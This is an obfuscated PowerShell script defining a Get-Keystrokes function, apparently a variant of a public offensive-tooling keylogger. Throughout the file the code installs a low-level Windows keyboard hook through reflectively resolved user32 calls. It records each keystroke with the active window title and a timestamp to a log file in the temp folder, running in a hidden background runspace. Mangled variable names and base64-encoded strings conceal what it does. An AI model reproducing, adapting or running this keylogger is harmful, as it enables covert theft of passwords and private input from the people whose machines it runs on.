function Get-Keystrokes {
    [CmdletBinding()] 
    Param (
        [Parameter(Position = 0)]
        [ValidateScript({Test-Path (rvpa (Split-Path -Parent -Path $_)) -PathType Container})]
        [String]$LogPath = "$($env:TEMP)\key8.log",
        [Parameter(Position = 1)]
        [Double]$Timeout,
        [Parameter()]
        [Switch]$PassThru
    )
    $LogPath = Join-Path (rvpa (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
    try { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBUAHkAcABlAGQASwBlAHkAIgAsACIAVwBpAG4AZABvAHcAVABpAHQAbABlACIALAAiAFQAaQBtAGUAIgA='))) | Out-File -FilePath $LogPath -Encoding unicode }
    catch { throw $_ }
    ${/===\/======\____} = {
        Param (
            [Parameter(Position = 0)]
            [String]$LogPath,
            [Parameter(Position = 1)]
            [Double]$Timeout
        )
        function local:Get-DelegateType {
            Param (
                [OutputType([Type])]
                [Parameter( Position = 0)]
                [Type[]]
                ${__/\/=\/\/\_/\___/} = (New-Object Type[](0)),
                [Parameter( Position = 1 )]
                [Type]
                ${___/\/\_/\__/=\___} = [Void]
            )
            ${_/\_/=\___/\/\/==} = [AppDomain]::CurrentDomain
            ${/=\/\/==\/=\/===\} = New-Object Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
            ${/=\__/==\/=\__/\/} = ${_/\_/=\___/\/\/==}.DefineDynamicAssembly(${/=\/\/==\/=\/===\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            ${_____/\_/==\_/\_/} = ${/=\__/==\/=\__/\/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
            ${/==\___/==\/\/=\_} = ${_____/\_/==\_/\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
            ${/==\_/\___/\__/==} = ${/==\___/==\/\/=\_}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${__/\/=\/\/\_/\___/})
            ${/==\_/\___/\__/==}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
            ${_/==\/\/=\/\/\/\_} = ${/==\___/==\/\/=\_}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${___/\/\_/\__/=\___}, ${__/\/=\/\/\_/\___/})
            ${_/==\/\/=\/\/\/\_}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
            ${/==\___/==\/\/=\_}.CreateType()
        }
        function local:Get-ProcAddress {
            Param (
                [OutputType([IntPtr])]
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                ${___/\/\/\/===\_/\/},
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                ${_____/=\_/\__/=\/\}
            )
            ${_/\/=\/\/==\_/\_/} = [AppDomain]::CurrentDomain.GetAssemblies() |
                ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
            ${/=\__/==\/\__/\_/} = ${_/\/=\/\/==\_/\_/}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
            ${__/\/=\/==\/\/=\_} = ${/=\__/==\/\__/\_/}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
            ${___/=\__/=\/\/\__} = ${/=\__/==\/\__/\_/}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
            ${/\_____/=\____/=\} = ${__/\/=\/==\/\/=\_}.Invoke($null, @(${___/\/\/\/===\_/\/}))
            ${_/\_/==\/=\/\/\/=} = New-Object IntPtr
            ${/=\___/\_/\_/=\_/} = New-Object System.Runtime.InteropServices.HandleRef(${_/\_/==\/=\/\/\/=}, ${/\_____/=\____/=\})
            ${___/=\__/=\/\/\__}.Invoke($null, @([Runtime.InteropServices.HandleRef]${/=\___/\_/\_/=\_/}, ${_____/=\_/\__/=\/\}))
        }
        [void][Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAA=='))))
        ${_/\/\/====\_/====} = Get-ProcAddress user32.dll SetWindowsHookExA
	    ${/\____/=====\/\_/} = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])
	    ${__/\___/==\_/===\} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\/====\_/====}, ${/\____/=====\/\_/})
        ${_/=\/==\/=\_/\/\_} = Get-ProcAddress user32.dll CallNextHookEx
	    ${/=\/======\/\___/} = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])
	    ${/==\/\__/===\____} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/==\/=\_/\/\_}, ${/=\/======\/\___/})
        ${____/==\/==\__/=\} = Get-ProcAddress user32.dll UnhookWindowsHookEx
	    ${_/\/==\/==\__/===} = Get-DelegateType @([IntPtr]) ([Void])
	    ${_______/\/=\_/=\_} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/==\/==\__/=\}, ${_/\/==\/==\__/===})
        ${/==\/==\/====\_/\} = Get-ProcAddress user32.dll PeekMessageA
	    ${/==\__/==\/\/=\__} = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])
	    ${_/\/=\_/==\/\/\_/} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/==\/====\_/\}, ${/==\__/==\/\/=\__})
        ${_/=\__/==\/\/=\__} = Get-ProcAddress user32.dll GetAsyncKeyState
	    ${_/\___/==\/=\/=\_} = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
	    ${___/\_/==\__/==\/} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\__/==\/\/=\__}, ${_/\___/==\/=\/=\_})
        ${_/\/==\_/\_____/\} = Get-ProcAddress user32.dll GetForegroundWindow
	    ${____/=====\____/=} = Get-DelegateType @() ([IntPtr])
	    ${/=\_/==\/\/=====\} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/==\_/\_____/\}, ${____/=====\____/=})
        ${_/========\_/==\/} = Get-ProcAddress user32.dll GetWindowTextA
	    ${__/=\_/\/=\_/=\/\} = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])
	    ${_/\_/\____/\_/=\_} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/========\_/==\/}, ${__/=\_/\/=\_/=\/\})
        ${/=\__/===\/=\/\_/} = Get-ProcAddress kernel32.dll GetModuleHandleA
	    ${_/\/=\/\/\/\_/\_/} = Get-DelegateType @([String]) ([IntPtr])
	    ${__/\/=\/==\/\/=\_} = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/===\/=\/\_/}, ${_/\/=\/\/\/\_/\_/})
        ${_/\_/\_/\/\___/\/} = {
            Param (
                [Parameter()]
                [Int32]$Code,
                [Parameter()]
                [IntPtr]$wParam,
                [Parameter()]
                [IntPtr]$lParam
            )
            ${/=\___/\_/==\/\_/} = [Windows.Forms.Keys]
            ${_/\/=\__/\_/===\_} = $wParam.ToInt32()
            if ($Code -ge 0 -and (${_/\/=\__/\_/===\_} -eq 0x100 -or ${_/\/=\__/\_/===\_} -eq 0x104)) {
                ${_/=\/======\__/=\} = ${/=\_/==\/\/=====\}.Invoke()
                ${__/\__/\__/\/==\_} = ${___/\_/==\__/==\/}.Invoke(${/=\___/\_/==\/\_/}::ShiftKey)
                if ((${__/\__/\__/\/==\_} -band 0x8000) -eq 0x8000) { ${_____/==\__/\/===} = $true }
                else { ${_____/==\__/\/===} = $false }
                ${__/=\/=\/\/\____/} = [Console]::CapsLock
                ${_/\/=\___/==\__/=} = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)
                if (${_/\/=\___/==\__/=} -gt 64 -and ${_/\/=\___/==\__/=} -lt 91) { 
                    if (${_____/==\__/\/===} -xor ${__/=\/=\/\/\____/}) { ${/==\_/==\/=\/\_/=} = ${_/\/=\___/==\__/=}.ToString() }
                    else { ${/==\_/==\/=\/\_/=} = ${_/\/=\___/==\__/=}.ToString().ToLower() }
                }
                elseif (${_/\/=\___/==\__/=} -ge 96 -and ${_/\/=\___/==\__/=} -le 111) { 
                    switch (${_/\/=\___/==\__/=}.value__) {
                        96 { ${/==\_/==\/=\/\_/=} = '0' }
                        97 { ${/==\_/==\/=\/\_/=} = '1' }
                        98 { ${/==\_/==\/=\/\_/=} = '2' }
                        99 { ${/==\_/==\/=\/\_/=} = '3' }
                        100 { ${/==\_/==\/=\/\_/=} = '4' }
                        101 { ${/==\_/==\/=\/\_/=} = '5' }
                        102 { ${/==\_/==\/=\/\_/=} = '6' }
                        103 { ${/==\_/==\/=\/\_/=} = '7' }
                        104 { ${/==\_/==\/=\/\_/=} = '8' }
                        105 { ${/==\_/==\/=\/\_/=} = '9' }
                        106 { ${/==\_/==\/=\/\_/=} = "*" }
                        107 { ${/==\_/==\/=\/\_/=} = "+" }
                        108 { ${/==\_/==\/=\/\_/=} = "|" }
                        109 { ${/==\_/==\/=\/\_/=} = "-" }
                        110 { ${/==\_/==\/=\/\_/=} = "." }
                        111 { ${/==\_/==\/=\/\_/=} = "/" }
                    }
                }
                elseif ((${_/\/=\___/==\__/=} -ge 48 -and ${_/\/=\___/==\__/=} -le 57) -or (${_/\/=\___/==\__/=} -ge 186 -and ${_/\/=\___/==\__/=} -le 192) -or (${_/\/=\___/==\__/=} -ge 219 -and ${_/\/=\___/==\__/=} -le 222)) {                      
                    if (${_____/==\__/\/===}) {                           
                        switch (${_/\/=\___/==\__/=}.value__) { 
                            48 { ${/==\_/==\/=\/\_/=} = ')' }
                            49 { ${/==\_/==\/=\/\_/=} = '!' }
                            50 { ${/==\_/==\/=\/\_/=} = '@' }
                            51 { ${/==\_/==\/=\/\_/=} = '#' }
                            52 { ${/==\_/==\/=\/\_/=} = '$' }
                            53 { ${/==\_/==\/=\/\_/=} = '%' }
                            54 { ${/==\_/==\/=\/\_/=} = '^' }
                            55 { ${/==\_/==\/=\/\_/=} = '&' }
                            56 { ${/==\_/==\/=\/\_/=} = '*' }
                            57 { ${/==\_/==\/=\/\_/=} = '(' }
                            186 { ${/==\_/==\/=\/\_/=} = ':' }
                            187 { ${/==\_/==\/=\/\_/=} = '+' }
                            188 { ${/==\_/==\/=\/\_/=} = '<' }
                            189 { ${/==\_/==\/=\/\_/=} = '_' }
                            190 { ${/==\_/==\/=\/\_/=} = '>' }
                            191 { ${/==\_/==\/=\/\_/=} = '?' }
                            192 { ${/==\_/==\/=\/\_/=} = '~' }
                            219 { ${/==\_/==\/=\/\_/=} = '{' }
                            220 { ${/==\_/==\/=\/\_/=} = '|' }
                            221 { ${/==\_/==\/=\/\_/=} = '}' }
                            222 { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABEAG8AdQBiAGwAZQAgAFEAdQBvAHQAZQBzAD4A'))) }
                        }
                    }
                    else {                           
                        switch (${_/\/=\___/==\__/=}.value__) {
                            48 { ${/==\_/==\/=\/\_/=} = '0' }
                            49 { ${/==\_/==\/=\/\_/=} = '1' }
                            50 { ${/==\_/==\/=\/\_/=} = '2' }
                            51 { ${/==\_/==\/=\/\_/=} = '3' }
                            52 { ${/==\_/==\/=\/\_/=} = '4' }
                            53 { ${/==\_/==\/=\/\_/=} = '5' }
                            54 { ${/==\_/==\/=\/\_/=} = '6' }
                            55 { ${/==\_/==\/=\/\_/=} = '7' }
                            56 { ${/==\_/==\/=\/\_/=} = '8' }
                            57 { ${/==\_/==\/=\/\_/=} = '9' }
                            186 { ${/==\_/==\/=\/\_/=} = ';' }
                            187 { ${/==\_/==\/=\/\_/=} = '=' }
                            188 { ${/==\_/==\/=\/\_/=} = ',' }
                            189 { ${/==\_/==\/=\/\_/=} = '-' }
                            190 { ${/==\_/==\/=\/\_/=} = '.' }
                            191 { ${/==\_/==\/=\/\_/=} = '/' }
                            192 { ${/==\_/==\/=\/\_/=} = '`' }
                            219 { ${/==\_/==\/=\/\_/=} = '[' }
                            220 { ${/==\_/==\/=\/\_/=} = '\' }
                            221 { ${/==\_/==\/=\/\_/=} = ']' }
                            222 { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABTAGkAbgBnAGwAZQAgAFEAdQBvAHQAZQA+AA=='))) }
                        }
                    }
                }
                else {
                    switch (${_/\/=\___/==\__/=}) {
                        ${/=\___/\_/==\/\_/}::F1  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADEAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F2  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADIAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F3  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADMAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F4  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADQAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F5  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADUAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F6  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADYAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F7  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADcAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F8  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADgAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F9  { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADkAPgA='))) }
                        ${/=\___/\_/==\/\_/}::F10 { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADEAMAA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::F11 { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADEAMQA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::F12 { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABGADEAMgA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Snapshot    { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABQAHIAaQBuAHQAIABTAGMAcgBlAGUAbgA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Scroll      { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABTAGMAcgBvAGwAbAAgAEwAbwBjAGsAPgA='))) }
                        ${/=\___/\_/==\/\_/}::Pause       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABQAGEAdQBzAGUALwBCAHIAZQBhAGsAPgA='))) }
                        ${/=\___/\_/==\/\_/}::Insert      { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABJAG4AcwBlAHIAdAA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Home        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIAG8AbQBlAD4A'))) }
                        ${/=\___/\_/==\/\_/}::Delete      { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABEAGUAbABlAHQAZQA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::End         { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABFAG4AZAA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Prior       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABQAGEAZwBlACAAVQBwAD4A'))) }
                        ${/=\___/\_/==\/\_/}::Next        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABQAGEAZwBlACAARABvAHcAbgA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Escape      { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABFAHMAYwA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::NumLock     { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABOAHUAbQAgAEwAbwBjAGsAPgA='))) }
                        ${/=\___/\_/==\/\_/}::Capital     { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABDAGEAcABzACAATABvAGMAawA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Tab         { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABUAGEAYgA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Back        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABCAGEAYwBrAHMAcABhAGMAZQA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::Enter       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABFAG4AdABlAHIAPgA='))) }
                        ${/=\___/\_/==\/\_/}::Space       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAgAD4A'))) }
                        ${/=\___/\_/==\/\_/}::Left        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABMAGUAZgB0AD4A'))) }
                        ${/=\___/\_/==\/\_/}::Up          { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABVAHAAPgA='))) }
                        ${/=\___/\_/==\/\_/}::Right       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABSAGkAZwBoAHQAPgA='))) }
                        ${/=\___/\_/==\/\_/}::Down        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABEAG8AdwBuAD4A'))) }
                        ${/=\___/\_/==\/\_/}::LMenu       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABBAGwAdAA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::RMenu       { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABBAGwAdAA+AA=='))) }
                        ${/=\___/\_/==\/\_/}::LWin        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABXAGkAbgBkAG8AdwBzACAASwBlAHkAPgA='))) }
                        ${/=\___/\_/==\/\_/}::RWin        { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABXAGkAbgBkAG8AdwBzACAASwBlAHkAPgA='))) }
                        ${/=\___/\_/==\/\_/}::LShiftKey   { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABTAGgAaQBmAHQAPgA='))) }
                        ${/=\___/\_/==\/\_/}::RShiftKey   { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABTAGgAaQBmAHQAPgA='))) }
                        ${/=\___/\_/==\/\_/}::LControlKey { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABDAHQAcgBsAD4A'))) }
                        ${/=\___/\_/==\/\_/}::RControlKey { ${/==\_/==\/=\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABDAHQAcgBsAD4A'))) }
                    }
                }
                ${/=\__/\/\_/\/==\/} = New-Object Text.Stringbuilder 256
                ${_/\_/\____/\_/=\_}.Invoke(${_/=\/======\__/=\}, ${/=\__/\/\_/\/==\/}, ${/=\__/\/\_/\/==\/}.Capacity)
                ${/=\/=\_/=\___/\/=} = @{
                    Key = ${/==\_/==\/=\/\_/=}
                    Time = [DateTime]::Now
                    Window = ${/=\__/\/\_/\/==\/}.ToString()
                }
                ${_/=\/=\/\_/==\_/=} = New-Object psobject -Property ${/=\/=\_/=\___/\/=}
                ${_/\/\_/=\__/=\_/\} = (${_/=\/=\/\_/==\_/=} | select Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]
                Out-File -FilePath $LogPath -Append -InputObject ${_/\/\_/=\__/=\_/\} -Encoding unicode
            }
            return ${/==\/\__/===\____}.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
        }
        ${___/==\/\/\__/\_/} = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
        ${/=\/\_/\_/\_/==\/} = ${_/\_/\_/\/\___/\/} -as ${___/==\/\/\__/\_/}
        ${______/\/==\_/==\} = (ps -Id $PID).MainModule.ModuleName
        ${/==\/=\/=\/=\/=\/} = ${__/\/=\/==\/\/=\_}.Invoke(${______/\/==\_/==\})
        ${_/=\_/\____/=\/\_} = ${__/\___/==\_/===\}.Invoke(0xD, ${/=\/\_/\_/\_/==\/}, ${/==\/=\/=\/=\/=\/}, 0)
        ${__/\____/=\__/=\/} = [Diagnostics.Stopwatch]::StartNew()
        while ($true) {
            if ($PSBoundParameters.Timeout -and (${__/\____/=\__/=\/}.Elapsed.TotalMinutes -gt $Timeout)) { break }
            ${_/\/=\_/==\/\/\_/}.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)
            sleep -Milliseconds 10
        }
        ${__/\____/=\__/=\/}.Stop()
        ${_______/\/=\_/=\_}.Invoke(${_/=\_/\____/=\/\_})
    }
    ${_/\/==\/=\__/=\__} = [PowerShell]::Create()
    [void]${_/\/==\/=\__/=\__}.AddScript(${/===\/======\____})
    [void]${_/\/==\/=\__/=\__}.AddArgument($LogPath)
    if ($PSBoundParameters.Timeout) { [void]${_/\/==\/=\__/=\__}.AddArgument($Timeout) }
    [void]${_/\/==\/=\__/=\__}.BeginInvoke()
    if ($PassThru.IsPresent) { return ${_/\/==\/=\__/=\__} }
}